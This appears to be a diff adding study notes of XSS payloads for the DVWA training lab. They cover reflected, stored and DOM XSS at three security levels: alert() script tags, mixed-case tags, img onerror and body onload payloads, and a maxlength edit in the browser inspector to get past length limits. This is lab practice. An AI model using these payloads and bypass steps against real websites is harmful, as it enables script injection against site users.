@@ -1,0 +1,72 @@
+Reflected XSS-
+Low Security
+<script>alert("abu")</script>
+
+Medium Security
+<Script>alert("abu")</Script> (Script S should be in capital letters unlike reflected XSS script)
+
+High Security
+<img src=x onerror=alert("falcon")>
+
+-------------
+Stored XSS-
+
+Low Security
+<script>alert("abu")</script>
+(malicious script is stored in the server so whenever user refreshes page it shows the alert)
+C:\xampp\htdocs\DVWA\vulnerabilities\xss_s (change maxlenght)
+image display: <img src="https://samples-files.com/samples/images/jpg/1920-1080-sample.jpg"
+ onerror=alert(document.domain)>
+
+Medium Security
+
+Name: Abu Bakar
+Message: alert(\"xss\")- if you view source you can see both name and message has been handled well so it wont work 
+
+try writing script in name : <Script>alert("abu")</Script> (capital letters as it is a medium level)
+you wont be able to write because of length restriction now inspect the name box and change maxlenght from 10 to 1000 then write script in name and name in message then click on sign in guestbook therefore it will run and give desired output.
+
+for image:
+name box : image display: <img src="https://samples-files.com/samples/images/jpg/1920-1080-sample.jpg"
+ onerror=alert(document.domain)>
+
+message box: abu
+
+High Security
+
+Same problem would occur in high level use same solution : script in name and name in message and inspect to change maxlenght of name box so script would fit
+
+name box: <body onload=alert("bingo")>
+message box: abu
+
+-------------
+DOM XSS-
+
+Low Security
+in url
+
+http://localhost/DVWA/vulnerabilities/xss_d/?default=<script>alert("hacked")</script>
+
+Medium security
+
+http://localhost/DVWA/vulnerabilities/xss_d/?default=English#<script>alert("hacked")</script>
+
+High security
+
+http://localhost/DVWA/vulnerabilities/xss_d/?default=English#<img src=x onerror=alert("falcon")>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
